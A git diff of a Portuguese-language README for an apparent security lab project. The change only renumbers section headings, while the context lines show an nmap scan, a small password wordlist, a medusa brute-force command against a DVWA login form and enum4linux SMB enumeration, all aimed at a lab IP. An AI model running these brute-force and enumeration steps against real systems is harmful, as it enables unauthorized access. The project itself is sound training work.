@@ -31,7 +31,7 @@ O objetivo deste projeto foi compreender as técnicas ofensivas e refletir sobre
       
 <br>
 
-## 🚪 Cenário de Ataque no Protocolo FTP:
+## 3 - 🚪 Cenário de Ataque no Protocolo FTP:
  * **Etapa 1:** Escanear possiveis portas abertas e o tipo de serviço:
    ```bash
    nmap -sV -p 21,22,80,445,139 coloque o IP
@@ -54,7 +54,7 @@ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
  
  * **Resultado da exploração:** Usuário e Login encontrados com sucesso ✔
 
-## 📑 Cenários de Ataques em Formulários de Login:
+## 4 - 📑 Cenários de Ataques em Formulários de Login:
 * **Etapa 3:** Entrar no site: DVWA
 ```bash
 192.168.56.102/dvwa/login.php
@@ -72,7 +72,7 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 
 - **Resumo:** O comando faz brute force no login do DVWA via HTTP, usando listas de usuários e senhas, enviando requisições do tipo POST, identificando falhas pelo texto “Login failed” e executando tudo em 6 tentativas acontecendo ao mesmo tempo.
 
-## 💻 Cenários de Ataques SMB:
+## 5 - 💻 Cenários de Ataques SMB:
 * **Etapa 4:** Enumerar informações de sistemas Windows ou serviços SMB/Samba.
 ```bash
 enum4linux -a 192.168.56.102 | tee enum4_output.txt
